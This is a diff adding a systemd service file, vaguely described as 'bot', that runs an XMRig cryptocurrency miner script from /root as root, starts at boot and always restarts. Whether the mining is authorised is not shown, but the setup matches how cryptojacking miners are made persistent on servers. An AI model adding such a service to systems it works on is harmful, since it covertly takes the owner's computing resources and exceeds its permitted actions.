@@ -1,0 +1,13 @@
+[Unit]
+Description=bot
+After=network.service
+
+[Service]
+User=root
+Type=simple
+Restart=always
+ExecStart=/root/xmrig-6.16.4/miner.sh
+WorkingDirectory=/root/xmrig-6.16.4
+
+[Install]
+WantedBy=multi-user.target
